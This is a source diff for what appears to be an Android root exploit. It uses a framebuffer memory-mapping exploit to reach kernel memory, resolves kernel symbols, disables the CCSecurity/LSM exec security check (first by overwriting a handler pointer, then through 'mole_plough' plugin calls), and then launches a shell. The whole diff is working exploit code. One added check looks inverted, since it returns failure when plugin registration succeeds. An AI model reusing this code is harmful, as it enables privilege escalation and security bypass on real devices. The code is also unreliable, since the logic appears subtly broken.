@@ -30,6 +30,7 @@
 #include "perf_swevent.h"
 #include "fb_mem_exploit/fb_mem.h"
 #include "kallsyms/kallsyms_in_memory.h"
+#include "plugins/mole_plough_plugin.h"
 
 typedef struct _supported_device {
   device_id_t device_id;
@@ -224,77 +225,34 @@ run_other_exploits(void)
   return attempt_diag_exploit(sys_setresuid_address);
 }
 
-static void*
-find_ccs_search_binary_handler_address_in_ccsecurity_ops(void *mmap_base_address)
-{
-  unsigned long int ccsecurity_ops = 0;
-  unsigned long int *ccs_search_binary_handlers;
-  int i = 0;
-  void *mapped_ccsecurity_ops;
-  void *found_address = NULL;
-
-  ccsecurity_ops = kallsyms_in_memory_lookup_name("ccsecurity_ops");
-  if (!ccsecurity_ops) {
-    return NULL;
-  }
-
-  ccs_search_binary_handlers = kallsyms_in_memory_lookup_names("__ccs_search_binary_handler");
-  if (!ccs_search_binary_handlers) {
-    return NULL;
-  }
-
-  mapped_ccsecurity_ops = fb_mem_convert_to_mmaped_address((void*)ccsecurity_ops, mmap_base_address);
-
-  while (ccs_search_binary_handlers[i]) {
-    found_address = memmem(mapped_ccsecurity_ops, 0x100, &ccs_search_binary_handlers[i], sizeof(ccs_search_binary_handlers[i]));
-    if (found_address) {
-      break;
-    }
-    i++;
-  }
-
-  free(ccs_search_binary_handlers);
-
-  return found_address;
-}
+static mole_plough_plugins *plugin_handler;
 
 static bool
-disable_ccs_search_binary_handler(void *mmap_base_address, void *user_data)
+disable_exec_security_check(void *mmap_base_address, void *user_data)
 {
-  unsigned long int search_binary_handler = 0;
-  int *ccs_search_binary_handler;
+  int ret;
 
-  search_binary_handler = kallsyms_in_memory_lookup_name("search_binary_handler");
-  if (!search_binary_handler) {
-    printf("Failed to get search_binary_handler address in kernel memory.\n");
-    return false;
-  }
-
-  ccs_search_binary_handler = find_ccs_search_binary_handler_address_in_ccsecurity_ops(mmap_base_address);
-  if (!ccs_search_binary_handler) {
-    printf("Failed to get __ccs_search_binary_handler address in kernel memory.\n");
-    return false;
-  }
-
-  *ccs_search_binary_handler = search_binary_handler;
-
-  return true;
-}
-
-static bool
-disable_lsm(void *mmap_base_address, void *user_data)
-{
   if (!kallsyms_in_memory_init(mmap_base_address, 0x1000000)) {
     return false;
   }
 
-  return disable_ccs_search_binary_handler(mmap_base_address, user_data);
+  plugin_handler = mole_plough_static_plugin_register();
+  if (plugin_handler) {
+    return false;
+  }
+
+  mole_plough_plugin_resolve_symbols(plugin_handler);
+
+  ret = mole_plough_plugin_disable_exec_security_check(plugin_handler,
+                                                       fb_mem_convert_to_mmaped_address,
+                                                       mmap_base_address);
+  return (ret == 0);
 }
 
 static bool
-attempt_to_disable_lsm(void)
+attempt_to_disable_exec_security_check(void)
 {
-  return fb_mem_run_exploit(disable_ccs_search_binary_handler, NULL);
+  return fb_mem_run_exploit(disable_exec_security_check, NULL);
 }
 
 #define SHELL_PATH "/system/bin/sh"
@@ -314,7 +272,7 @@ main(int argc, char **argv)
     printf("Failed to execute shell due to %s.\n", strerror(errno));
   }
 
-  if (!attempt_to_disable_lsm()) {
+  if (!attempt_to_disable_exec_security_check()) {
     exit(EXIT_FAILURE);
   }
   return execl(SHELL_PATH, SHELL_PATH, NULL);
